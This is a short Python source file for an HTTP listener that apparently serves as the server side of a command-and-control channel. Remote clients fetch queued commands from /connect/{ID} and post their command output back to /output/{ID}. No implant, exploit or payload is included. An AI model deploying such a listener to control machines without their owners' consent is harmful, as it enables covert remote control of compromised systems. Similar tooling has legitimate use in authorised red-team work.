from http.server import BaseHTTPRequestHandler, HTTPServer
import threading

class HTTPCommandHandler(BaseHTTPRequestHandler):
    cmd_queue = {}
    output_queue = {}

    def do_GET(self):
        # /connect/{ID} -> Command fetching
        if self.path.startswith("/connect/"):
            client_id = self.path.split("/")[-1]
            cmd = self.cmd_queue.get(client_id, "")
            self.send_response(200)
            self.end_headers()
            self.wfile.write(cmd.encode("utf-8"))
            if cmd:
                self.cmd_queue[client_id] = "" # Clear sent command
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
         # /output/{ID} -> Output receiving
        if self.path.startswith("/output/"):
            client_id = self.path.split("/")[-1]
            length = int(self.headers['Content-Length'])
            output = self.rfile.read(length).decode("utf-8")
            print(f"\n[{client_id}] Output:\n{output}")
            self.send_response(200)
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

def start_http_listener(host, port):
    server = HTTPServer((host, port), HTTPCommandHandler)
    print(f"[*] HTTP Server listening on {host}:{port}")
    server.serve_forever()

if __name__ == "__main__":
    # Standalone test için
    start_http_listener("0.0.0.0", 8080)
